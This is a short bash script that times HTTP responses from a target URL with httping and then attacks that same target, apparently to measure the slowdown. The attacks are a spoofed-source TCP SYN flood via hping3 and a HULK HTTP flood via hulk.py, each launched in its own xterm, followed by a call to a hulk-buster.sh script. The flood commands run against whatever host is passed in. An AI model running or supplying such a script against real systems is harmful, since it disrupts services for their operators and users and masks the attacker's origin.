#!/bin/bash

pingu()
{
	IP=$1
	REP=$2
	PRINT=$3
	echo "Calculating time to $IP... "
	httping $IP -c $REP > temp_httping.txt
	echo "$PRINT " `tail -n 1 temp_httping.txt | awk '{print $4}' | cut -d"/" -f2`
	media=$(tail -n 1 temp_httping.txt | awk '{print $4}' | cut -d "/" -f2)
	media=${media%.*}

	while read line
	do
	    if [[ $line == connected* ]];
	    then
	       data=$(echo "$line" | awk '{print $7}' | cut -d"=" -f2)
	       data=${data%.*}
	       temp=$(($data-$media)) #xi - media
	       temp2=$(($temp*$temp)) #(xi-media)^2
	       acum=$(($acum+$temp2)) #somatorio
	    fi
	done < "temp_httping.txt"
	n=$(($REP-1))
	variancia=$(($acum/$n)) #somatorio/(n-1)
	echo "variancia= $variancia"
	dpad=$(echo "sqrt ( $variancia )" | bc -l) ; echo $dpad

}

[ $1 ] && [ $2 ] || {
	echo ""
	echo "Usage: sudo bash $0 <url> <reps>"
	exit
	}

IP=$1
REP=$2

for CMD in xterm httping hping3
do
	if [ ! `which $CMD` ]
	then
		echo ""
		echo "[ERROR] Missing command/app \"$CMD\". Install  it first"
		echo ""
		echo "try: sudo apt install $CMD -y"
		echo ""
		exit
	fi
done

pingu $IP $REP "Average time (in ms):"


echo ""
echo "Next test: TCP SYN FLOOD with hping3"
echo -n "Starting... "
sleep 5

echo "GO!"
xterm -e "sudo hping3 -c 15000 -d 120 -S -w 512 -p 80 --flood --rand-source $IP" &
sleep 5
pingu $IP $REP "Average time with TCP SYN FLOOD (in ms):"

sleep 10

echo ""
echo "Next test: Flooding atack with hulk."
echo -n "Starting..."
echo "Smash!"

xterm -e "python hulk.py $IP" &
sleep 3
pingu $IP $REP "Average time with Flooding (in ms):"
bash hulk-buster.sh



rm temp_httping.txt
